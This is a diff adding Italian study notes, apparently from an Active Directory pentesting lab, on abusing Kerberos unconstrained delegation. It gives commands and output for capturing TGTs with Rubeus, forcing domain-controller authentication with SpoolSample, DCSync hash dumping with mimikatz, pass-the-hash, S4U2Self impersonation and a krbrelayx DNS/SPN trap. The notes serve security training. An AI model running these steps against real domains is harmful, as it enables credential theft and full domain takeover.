@@ -2,6 +2,7 @@
   - [Unconstrained Delegation](#unconstrained-delegation)
     - [Il flusso:](#il-flusso)
     - [Perché "delegates his TGT" è così pericoloso](#perché-delegates-his-tgt-è-così-pericoloso)
+    - [Unconstrained Delegation - Computer](#unconstrained-delegation---computer)
     - [Lo scenario di attacco concreto](#lo-scenario-di-attacco-concreto)
       - [Piccola sottigliezza interessante!](#piccola-sottigliezza-interessante)
         - [La cosa sottile](#la-cosa-sottile)
@@ -10,8 +11,17 @@
           - [Il problema dell'authenticator](#il-problema-dellauthenticator)
     - [Cos'è lsass](#cosè-lsass)
     - [Cosa fa Rubeus monitor](#cosa-fa-rubeus-monitor)
+    - [Altri attacchi Unconstrained Delegation - Computer](#altri-attacchi-unconstrained-delegation---computer)
+      - [In attesa dell'autenticazione dell'utente privilegiato](#in-attesa-dellautenticazione-dellutente-privilegiato)
+      - [Sfruttare il Printer Bug](#sfruttare-il-printer-bug)
+        - [Se il computer di destinazione non è un Domain Controller](#se-il-computer-di-destinazione-non-è-un-domain-controller)
+    - [Unconstrained Delegation - Users](#unconstrained-delegation---users)
   - [Constrained Delegation (S4U2Proxy)](#constrained-delegation-s4u2proxy)
     - [La differenza pratica con unconstrained](#la-differenza-pratica-con-unconstrained)
+    - [S4U2Proxy \& S4U2Self](#s4u2proxy--s4u2self)
+      - [S4U2Proxy](#s4u2proxy)
+      - [S4U2Self — Il problema che risolve](#s4u2self--il-problema-che-risolve)
+        - [Come funziona S4U2Self](#come-funziona-s4u2self)
     - [L'unica eccezione — protocol transition](#lunica-eccezione--protocol-transition)
       - [TrustedToAuthForDelegation (Protocol Transition)](#trustedtoauthfordelegation-protocol-transition)
       - [Constrained delegation senza protocol transition](#constrained-delegation-senza-protocol-transition)
@@ -119,6 +129,26 @@ Solo un amministratore o un utente con privilegi elevati, a cui tali privilegi s
   Attaccante è Domain Admin
   ```
 
+### Unconstrained Delegation - Computer
+- Era l'unico tipo di delega disponibile in Windows 2000.
+- Se un utente richiede un ticket di assistenza su un server con la uncostrained delegation abilitata, il Ticket Granting Ticket (TGT) dell'utente viene incorporato nel ticket di assistenza che viene quindi presentato al server. Il server può memorizzare nella cache questo ticket e quindi fingere di essere quell'utente per le successive richieste di risorse nel dominio. 
+- Se l'unconstrained delegation non è abilitata, in memoria verrà memorizzato solo il ticket del Ticket Granting Service (TGS) dell'utente. In questo caso, se la macchina viene compromessa, un utente malintenzionato potrebbe accedere solo alla risorsa specificata nel ticket TGS nel contesto di quell'utente.
+
+
+![alt text](images/delegation/properties_unconstrained.png)
+Può impersonare verso qualsiasi servizio, solo Kerberos!
+
+Unconstrained abilitato vs disabilitato
+```
+Unconstrained abilitato:        Unconstrained NON abilitato:
+In memoria su WEBSRV            In memoria su WEBSRV
+├── TGT dell'utente             └── solo TGS per quel servizio
+└── TGS del servizio            
+         ↓                               ↓
+Attaccante può impersonare       Attaccante può accedere
+l'utente OVUNQUE                 SOLO a quella risorsa specifica
+```
+
 ### Lo scenario di attacco concreto
 Tu hai compromesso Service A (che ha unconstrained delegation). Aspetti che un DA si autentichi a quel servizio — magari forzandolo tu stesso con il printer bug (vedi pagina AD.md per saperne di più del printer bug):
 ```
@@ -213,6 +243,752 @@ lsass memory su Service A:
 │ Sessione DC$      → TGT DC$  ← │ Rubeus lo legge qui
 └─────────────────────────────────┘
 ```
+
+
+### Altri attacchi Unconstrained Delegation - Computer
+#### In attesa dell'autenticazione dell'utente privilegiato
+Se riusciamo a compromettere un server con unconstrained delegation abilitata e un amministratore di dominio effettua successivamente l'accesso, saremo in grado di estrarre il suo TGT e utilizzarlo per spostarci lateralmente e compromettere altre macchine, inclusi i controller di dominio.
+
+Rubeus è lo strumento ideale per questo tipo di attacco. Come amministratore locale, è possibile eseguire Rubeus per monitorare i ticket memorizzati. Se viene rilevato un TGT all'interno di un ticket TGS, Rubeus ce lo mostrerà.
+
+```
+.\Rubeus.exe monitor /interval:5 /nowrap
+```
+
+Pochi istanti dopo, Sarah Lafferty si connette al server compromesso. Rubeus recupera la copia del TGT di Sarah che era incorporata nel suo biglietto TGS e ce la mostra codificata in base64.
+```
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 5 seconds for new TGTs
+
+[*] 8/14/2020 11:06:40 AM UTC - Found new TGT:
+
+  User                  :  sarah.lafferty@INLANEFREIGHT.LOCAL
+  StartTime             :  8/14/2020 4:06:37 AM
+  EndTime               :  8/14/2020 2:06:37 PM
+  RenewTill             :  8/21/2020 4:06:37 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  Base64EncodedTicket   :
+
+    doIFmTCCBZWgAwIBBaEDAgEWooIEgjCCBH5hggR6MIIEdqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQsMIIEKKADAgESoQMCAQKiggQaBIIEFr7cTE+mYOQsYF69H0dnaQwX2Iy/dB0k91uEBGQh/Dk0lm12PzkVgX<SNIP>
+```
+
+Grazie a PowerView, possiamo elencare i gruppi a cui appartiene Sarah. Risulta essere nel gruppo Domain Admins. Quindi ora abbiamo il TGT di un amministratore di dominio.
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainGroup -MemberIdentity sarah.lafferty
+
+grouptype              : DOMAIN_LOCAL_SCOPE, SECURITY
+iscriticalsystemobject : True
+samaccounttype         : ALIAS_OBJECT
+samaccountname         : Denied RODC Password Replication Group
+whenchanged            : 7/26/2020 8:14:37 PM
+<SNIP>
+
+grouptype              : GLOBAL_SCOPE, SECURITY
+admincount             : 1
+iscriticalsystemobject : True
+samaccounttype         : GROUP_OBJECT
+samaccountname         : Domain Admins
+whenchanged            : 8/14/2020 11:04:50 AM
+<SNIP>
+
+usncreated             : 12348
+grouptype              : GLOBAL_SCOPE, SECURITY
+samaccounttype         : GROUP_OBJECT
+samaccountname         : Domain Users
+whenchanged            : 7/26/2020 8:14:37 PM
+<SNIP>
+```
+
+Useremo quindi questo TGT per accedere al CIFSservizio del Domain Controller, ad esempio. L'opzione ```/ptt``` viene utilizzata per caricare in memoria il ticket ricevuto, in modo che possa essere utilizzato per richieste future.
+
+> Nota: possiamo anche utilizzare il comando net view \\COMPUTERNAME per identificare le azioni disponibili.
+
+Utilizzo del biglietto per richiedere un altro biglietto:
+```
+PS C:\Tools> .\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Ask TGS
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (10.129.1.207)
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'cifs/dc01.INLANEFREIGHT.local'
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIFyDCCBcSgAwIBBaEDAgEWooIErTCCBKlhggSlMIIEoaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKzApoAMCAQKhIjAgGwRjaWZzGxhkYzAxLklOTEFORUZSRUlHSFQubG9jYWyjggRUMIIEUKADAgES
+      oQMCAQOiggRCBIIEPrCawPV<SNIP>
+
+  ServiceName           :  cifs/dc01.INLANEFREIGHT.local
+  ServiceRealm          :  INLANEFREIGHT.LOCAL
+  UserName              :  sarah.lafferty
+  UserRealm             :  INLANEFREIGHT.LOCAL
+  StartTime             :  8/14/2020 4:21:49 AM
+  EndTime               :  8/14/2020 2:06:37 PM
+  RenewTill             :  8/21/2020 4:06:37 AM
+  Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType               :  aes256_cts_hmac_sha1
+  Base64(key)           :  zRzk0ldsF4rb7p7/MlfRkhOzkjIHL4DSok1vXYS3lt8=
+```
+Nel caso in cui il comando precedente non funzioni, possiamo anche utilizzare l' azione di rinnovo per ottenere un TGT completamente nuovo invece di un biglietto TGS:
+
+```
+PS C:\Tools> .\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: Renew Ticket
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
+[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\brian.willis'
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIGHDCCBhigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D<SNIP>.
+```
+
+Una volta ottenuto il TGS o il TGT, possiamo elencare il contenuto del file system del Domain Controller come mostrato nel comando seguente.
+
+```
+PS C:\Tools> dir \\dc01.inlanefreight.local\c$
+
+ Volume in drive \\dc01.inlanefreight.local\c$ has no label.
+ Volume Serial Number is 7674-0745
+
+ Directory of \\dc01.inlanefreight.local\c$
+
+07/27/2020  05:56 PM    <DIR>          Department Shares
+07/16/2016  06:23 AM    <DIR>          PerfLogs
+07/28/2020  05:35 AM    <DIR>          Program Files
+07/27/2020  12:14 PM    <DIR>          Program Files (x86)
+07/27/2020  07:37 PM    <DIR>          Software
+07/30/2020  07:15 PM    <DIR>          Tools
+07/30/2020  11:49 AM    <DIR>          Users
+07/30/2020  09:13 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               8 Dir(s)  27,711,119,360 bytes free
+```
+
+> Potremmo anche richiedere un ticket TGS per il servizio LDAP e chiedere la sincronizzazione con il controller di dominio per ottenere tutti gli hash delle password degli utenti.
+
+#### Sfruttare il Printer Bug
+Per info sul Printer Bug vedi AD.md.
+
+Ma insomma, qualsiasi utente di dominio può forzare un server Windows ad autenticarsi verso un host arbitrario tramite il servizio Spooler di stampa.
+```
+Attaccante dice a DC01:
+"Hey, connettiti a SQL01 per una notifica di stampa"
+         ↓
+DC01 si autentica a SQL01 via SMB
+(non può rifiutarsi, è il protocollo)
+         ↓
+DC01 invia il suo TGT a SQL01 🔴
+```
+
+L'attacco combinato step by step
+```
+Prerequisiti:
+├── SQL01 compromesso ✅
+├── SQL01 ha Unconstrained Delegation ✅
+└── DC01 ha il servizio Spooler attivo ✅
+
+Step 1: Avvia Rubeus in monitor mode su SQL01
+        → monitora continuamente nuovi TGT in memoria
+
+Step 2: Lancia SpoolSample
+        SpoolSample DC01 SQL01
+        → forza DC01 ad autenticarsi a SQL01
+
+Step 3: DC01 si connette a SQL01 via SMB
+        → il TGT di DC01$ viene cachato in memoria su SQL01
+
+Step 4: Rubeus cattura il TGT di DC01$
+
+Step 5: Pass-the-Ticket con il TGT di DC01$
+        → sei il Domain Controller
+
+Step 6: DCSync attack
+        → dumpi tutti gli hash del dominio 🔴
+```
+
+Visivamente l'attacco completo
+```
+                    SpoolSample
+Attaccante ──────────────────────→ DC01
+(su SQL01)         "connettiti     │
+                    a SQL01"       │ autenticazione forzata
+                                   ↓
+SQL01 ←──────────── TGT di DC01$ ──┘
+  │
+  │ Rubeus cattura il TGT
+  ↓
+DCSync → tutti gli hash → dominio compromesso 🔴
+```
+Se il servizio Spooler non è attivo su DC01, si può usare la stessa tecnica contro qualsiasi altro computer del dominio:
+```
+DC01 senza Spooler?
+         ↓
+Forza un altro computer (es. FILE01) ad autenticarsi
+         ↓
+Cattura il TGT di FILE01$ (account macchina)
+         ↓
+Crea Silver Ticket con Rubeus
+(accesso a servizi specifici di FILE01)
+```
+
+Monitoraggio dei ticket con Rubeus
+```
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 5 seconds for new TGTs
+```
+
+Eseguendo Rubeus in modalità monitor, tentiamo quindi di attivare il printer bug dallo stesso host (SQL01) eseguendo SpoolSample (https://github.com/leechristensen/SpoolSample) in un'altra finestra della console. La sintassi per questo strumento è ```SpoolSample.exe <target server> <capture server>```, dove il server di destinazione nel nostro laboratorio di esempio è ```DC01``` e il server di acquisizione è ```SQL01```.
+
+```
+PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
+
+[+] Converted DLL to shellcode
+[+] Executing RDI
+[+] Calling exported function
+TargetServer: \\dc01.inlanefreight.local, CaptureServer: \\sql01.inlanefreight.local
+Target server attempted authentication and got an access denied. If coercing authentication to an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expected and indicates the coerced authentication worked.
+```
+
+Se tutto funziona come previsto, riceveremo il messaggio di conferma sopra riportato dallo strumento. Tornando alla console ```Rubeus``` in modalità monitor, abbiamo recuperato il TGT dall'account ```DC01$```, che corrisponde all'account del computer del controller di dominio.
+```
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 5 seconds for new TGTs
+
+[*] 8/14/2020 11:49:26 AM UTC - Found new TGT:
+
+  User                  :  DC01$@INLANEFREIGHT.LOCAL
+  StartTime             :  8/14/2020 4:22:44 AM
+  EndTime               :  8/14/2020 2:22:44 PM
+  RenewTill             :  8/20/2020 6:52:29 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUl<SNIP>
+```
+
+Possiamo usare questo ticket per ottenere un nuovo TGT valido in memoria usando l'opzione ```renew``` in Rubeus.
+```
+PS C:\Tools> .\Rubeus.exe renew /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQ
+uTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMCAQKiggPxBIID7XBw4BNnnymchVY/H/
+9966JMGtJhKaNLBt21SY3+on4lrOrHo<SNIP> /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Renew Ticket
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (10.129.1.207)
+[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\DC01$'
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMC
+      AQKiggPxBIID7W7EOz2Zqm1a6b9/cCHeJbZdt0qgV8Wgw1BS2Jctk8X9l6ibkK7G+s/jyPDL6ReV0OvP
+      p3ClWOjdoLO3jH<SNIP>
+    
+[+] Ticket successfully imported!
+```
+
+Ora che abbiamo il TGT ```DC01$``` in memoria, possiamo eseguire l'attacco ```DCsync``` per recuperare l'hash della password NTLM di un utente target. In questo esempio, recuperiamo i segreti per l'utente sarah.lafferty.
+```
+C:\Tools> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  
+mimikatz # lsadump::dcsync /user:sarah.lafferty
+
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'sarah.lafferty' will be the user account
+
+Object RDN           : sarah.lafferty
+
+** SAM ACCOUNT **
+
+SAM Username         : sarah.lafferty
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 8/14/2020 4:06:13 AM
+Object Security ID   : S-1-5-21-2974783224-3764228556-2640795941-1122
+Object Relative ID   : 1122
+
+Credentials:
+  Hash NTLM: 0fcb586d2aec31967c8a310d1ac2bf50
+    ntlm- 0: 0fcb586d2aec31967c8a310d1ac2bf50
+    ntlm- 1: cf3a5525ee9414229e66279623ed5c58
+    lm  - 0: 2fd05b1ff89bfeed627937845f3bc535
+    lm  - 1: 3cf0c818426269923b3a993b071b81d5
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e27b6e4d84697eb7cf50dc6d0efdb226
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : INLANEFREIGHT.LOCALsarah.lafferty
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : ba5b9b6850a1aea865ab1a7fdc895d1e27f39c327b8f7d4c96132b4438727386
+      aes128_hmac       (4096) : bee242dbe9cb898c67b8075e13384b22
+      des_cbc_md5       (4096) : 029e1c2af1237351
+    OldCredentials
+      aes256_hmac       (4096) : 13b57fa4a6c0f4adce4b1d85e64a909d35dce98736909f370154f9bd08b8bc67
+      aes128_hmac       (4096) : 1fdbc782bcdfcd692923dc54785d5ee1
+      des_cbc_md5       (4096) : ba677a73a82a2a9e
+
+* Primary:Kerberos *
+    Default Salt : INLANEFREIGHT.LOCALsarah.lafferty
+    Credentials
+      des_cbc_md5       : 029e1c2af1237351
+    OldCredentials
+      des_cbc_md5       : ba677a73a82a2a9e
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  966bec5d60500f0e964fb78be94cc0a8
+    02  1abbf4255613844082376a5288cfcfb2
+    03  c74c93a52310d2a88581ffb075aeff33
+    <SNIP>
+```
+
+Possiamo acquisire l'hash di qualsiasi account, come ad esempio l'account Amministratore, e quindi utilizzare Rubeus o Mimikatz per ottenere un ticket dall'account compromesso. Ad esempio, prendiamo l'hash di Sarah ```0fcb586d2aec31967c8a310d1ac2bf50e``` creiamo un ticket con esso:
+```
+# Utilizzo di Rubeus per richiedere un biglietto come Sarah
+PS C:\Tools> .\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 0fcb586d2aec31967c8a310d1ac2bf50
+[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\sarah.lafferty'
+[*] Using domain controller: 172.16.99.3:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+<SNIP>
+```
+
+Ora possiamo usare questo biglietto e impersonare Sarah:
+```
+# Utilizzo del ticket di Sarah per accedere al controller di dominio
+PS C:\Tools> dir \\dc01.inlanefreight.local\c$
+
+ Volume in drive \\dc01.inlanefreight.local\c$ has no label.
+ Volume Serial Number is 7674-0745
+
+ Directory of \\dc01.inlanefreight.local\c$
+
+07/27/2020  05:56 PM    <DIR>          Department Shares
+07/16/2016  06:23 AM    <DIR>          PerfLogs
+07/28/2020  05:35 AM    <DIR>          Program Files
+07/27/2020  12:14 PM    <DIR>          Program Files (x86)
+07/27/2020  07:37 PM    <DIR>          Software
+07/30/2020  07:15 PM    <DIR>          Tools
+07/30/2020  11:49 AM    <DIR>          Users
+07/30/2020  09:13 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               8 Dir(s)  27,711,119,360 bytes free
+```
+
+##### Se il computer di destinazione non è un Domain Controller
+```
+Scenario normale (quello visto prima):
+Catturi TGT di DC01$ → DCSync → fine
+
+Questo scenario:
+Catturi TGT di FILE01$ (non è un DC)
+         ↓
+Non puoi fare DCSync (non è un DC)
+         ↓
+Usi S4U2Self con il TGT di FILE01$
+per impersonare Administrator
+verso i servizi di FILE01$
+```
+
+Il caso d'uso reale è quando con il Printer Bug (o altro) hai catturato il TGT di un account macchina normale, es:
+```
+FILE01$   → non è un DC → DCSync non funziona
+WEBSRV01$ → non è un DC → DCSync non funziona
+SQL01$    → non è un DC → DCSync non funziona
+```
+In questi casi non puoi fare DCSync, quindi usi S4U2Self per:
+```
+TGT di FILE01$ 
+    ↓ S4U2Self
+TGS per CIFS/FILE01 as Administrator
+    ↓
+Accesso completo al filesystem di FILE01
+```
+
+Se il computer di destinazione non è un controller di dominio, o se vogliamo eseguire attacchi diversi da quelli predefiniti DCSync, possiamo utilizzare S4U2self per ottenere un Service Ticket per conto di qualsiasi utente che desideriamo impersonare.
+
+Con il ticket catturato DC01 utilizzando Rubeus monitor o SpoolSample possiamo usare ```Rubeus s4u /self``` per creare un ticket di servizio per qualsiasi servizio. Creiamo un ticket per connetterci tramite SMB utilizzando il servizio CIFS. Dovremo usare Rubeus s4u /self```, impostare il servizio alternativo su CIFS e usare il ticket che abbiamo:
+
+```
+PS C:\Tools> .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCB<SNIP>
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: S4U
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'DC01$@INLANEFREIGHT.LOCAL'
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
+[*] Sending S4U2self request to 172.16.99.3:88
+[+] S4U2self success!
+[*] Substituting alternative service name 'CIFS/dc01.inlanefreight.local'
+[*] Got a TGS for 'Administrator' to 'CIFS@INLANEFREIGHT.LOCAL'
+[*] base64(ticket.kirbi):
+<SNIP>
+```
+
+Questo comando ci permette di impersonare ```Administrator```  e richiedere un ticket di servizio per il servizio CIFS, abilitando le connessioni SMB come l'utente impersonato. **Questo metodo è particolarmente utile negli scenari in cui disponiamo di un ticket proveniente da un computer che non è un controller di dominio.**
+
+> Attenzione però! L'account Administrator built-in in molti domini moderni ha il flag: "Account is sensitive and cannot be delegated" 
+> Oppure potrebbe essere membro del gruppo Protected Users, che impedisce che il suo TGS venga usato per delegation. In caso si ha bisogno di un altro utente appartenente a Domain Admins.
+
+```
+PS C:\Tools> ls \\dc01.inlanefreight.local\c$
+
+    Directory: \\dc01.inlanefreight.local\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         4/3/2023   2:58 PM                carole.holmes
+d-----        2/25/2022  10:20 AM                PerfLogs
+d-r---        10/6/2021   3:50 PM                Program Files
+d-----        4/12/2023   3:24 PM                Program Files (x86)
+d-----        3/30/2023  11:08 AM                Shares
+d-----         4/4/2023   1:49 PM                Tools
+d-----        3/30/2023   3:13 PM                Unconstrained
+d-r---         4/4/2023  11:34 AM                Users
+d-----       10/14/2022   6:49 AM                Windows
+```
+
+> Perché funziona con un account macchina?
+>
+> Gli account macchina (DC01$) hanno implicitamente S4U2Self abilitato — possono richiedere TGS per sé stessi on behalf di qualsiasi utente, esattamente come un account di servizio.
+
+
+### Unconstrained Delegation - Users
+- Con un computer (SQL01$) potevi usare SpoolSample per forzare il DC a connettersi. Con un utente non puoi fare la stessa cosa — nessuno si "connette" spontaneamente a un utente.
+
+La soluzione è creare una trappola DNS:
+```
+sqldev ha TRUSTED_FOR_DELEGATION + SPN MSSQL_svc_dev/...
+         ↓
+Aggiungi SPN CIFS/roguecomputer.inlanefreight.local a sqldev
+         ↓
+Crea DNS record roguecomputer → il tuo IP
+         ↓
+Forza DC01 a connettersi a roguecomputer via PrinterBug
+         ↓
+DC01 chiede TGS per CIFS/roguecomputer
+→ sqldev ha quel SPN → DC01 manda il suo TGT dentro il TGS
+         ↓
+krbrelayx riceve il TGS, lo decifra con l'hash di sqldev
+→ estrae il TGT di DC01$
+```
+
+Gli utenti in Active Directory possono anche essere configurati per l'unconstrained delegation, e sfruttarla è piuttosto diverso. Per ottenere un elenco di account utente con questo flag impostato, possiamo utilizzare la funzione PowerView  ```Get-DomainUser``` con un filtro LDAP specifico che cercherà gli utenti con il flag ```TRUSTED_FOR_DELEGATION``` impostato nel loro UAC.
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+
+logoncount            : 0
+badpasswordtime       : 12/31/1600 7:00:00 PM
+distinguishedname     : CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+objectclass           : {top, person, organizationalPerson, user}
+name                  : sqldev
+objectsid             : S-1-5-21-2974783224-3764228556-2640795941-1110
+samaccountname        : sqldev
+codepage              : 0
+samaccounttype        : USER_OBJECT
+accountexpires        : 12/31/1600 7:00:00 PM
+countrycode           : 0
+whenchanged           : 8/4/2020 4:49:56 AM
+instancetype          : 4
+objectguid            : f71224a5-baa7-4aec-bfe9-56778184dc63
+lastlogon             : 12/31/1600 7:00:00 PM
+lastlogoff            : 12/31/1600 7:00:00 PM
+objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+dscorepropagationdata : {7/30/2020 3:09:16 AM, 7/30/2020 3:09:16 AM, 7/28/2020 1:45:00 AM, 7/28/2020 1:34:13 AM...}
+serviceprincipalname  : MSSQL_svc_dev/inlanefreight.local:1443
+memberof              : CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+whencreated           : 7/27/2020 6:46:20 PM
+badpwdcount           : 0
+cn                    : sqldev
+useraccountcontrol    : NORMAL_ACCOUNT, TRUSTED_FOR_DELEGATION
+usncreated            : 14648
+primarygroupid        : 513
+pwdlastset            : 7/27/2020 2:46:20 PM
+usnchanged            : 90194
+```
+
+Questo attacco mira a creare un record DNS che punti alla nostra macchina d'attacco. Questo record DNS corrisponderà a un computer fittizio nell'ambiente Active Directory. Una volta registrato il record DNS, aggiungeremo l'SPN ```CIFS/our_dns_record``` all'account compromesso, che si trova in un unconstrained delegation. Pertanto, se una vittima tenta di connettersi tramite SMB alla nostra macchina fittizia, invierà una copia del suo TGT nel ticket TGS, poiché richiederà un ticket per ```CIFS/our_registration_dns```. Questo ticket TGS verrà inviato all'indirizzo IP scelto durante la registrazione del record DNS, ovvero la nostra macchina d'attacco. A quel punto, non dovremo far altro che estrarre il TGT e utilizzarlo.
+
+Però per eseguire questo attacco servono due condizioni:
+
+- Condizione 1 — Compromettere sqldev
+  - Devi già avere le credenziali (o l'hash) di sqldev. Questo perché:
+    ```
+    krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
+    ```
+    Ha bisogno dell'hash di sqldev per decifrare il TGS che arriva e estrarre il TGT di ```DC01$``` dentro.
+
+- Condizione 2 — GenericWrite su sqldev
+  - Devi poter modificare la lista SPN di ```sqldev``` per aggiungere ```CIFS/roguecomputer.inlanefreight.local```.
+    ```
+    python addspn.py ... -t sqldev -s CIFS/roguecomputer.inlanefreight.local
+    ```
+    Questo richiede il permesso GenericWrite sull'account sqldev in AD. Normalmente un utente non può modificare i propri SPN — serve un account con quel privilegio.
+
+Quindi:
+```
+Scenario reale:
+Hai compromesso pixis
+         ↓
+pixis ha GenericWrite su sqldev ✅
+         ↓
+Hai anche le credenziali di sqldev ✅
+         ↓
+Puoi aggiungere SPN a sqldev con pixis
+e usare l'hash di sqldev per krbrelayx
+         ↓
+Attacco possibile 🔴
+```
+
+Per questo attacco utilizzeremo la suite di strumenti krbrelayx di Dirkjanm (https://github.com/dirkjanm/krbrelayx).
+
